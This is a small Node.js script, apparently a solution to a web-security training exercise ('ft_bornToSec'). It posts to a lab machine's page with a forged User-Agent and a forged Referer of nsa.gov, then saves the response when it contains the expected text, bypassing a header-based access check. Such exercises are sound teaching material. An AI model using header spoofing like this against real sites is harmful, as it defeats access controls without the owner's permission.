const axios = require('axios')
const fs = require('fs')


const config = {
    headers:
    {
     'User-Agent':'ft_bornToSec',
     'Referer': 'https://www.nsa.gov/'
    }
}
async function getData()
{
    await axios.post('http://10.12.100.89/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c','hacking',config).then(res => {
        if (res.data.indexOf('The') != -1)
        {
            fs.writeFileSync('./request.txt', res.data)
        }
}).catch(e => {
    console.log(e)
})
}
getData()
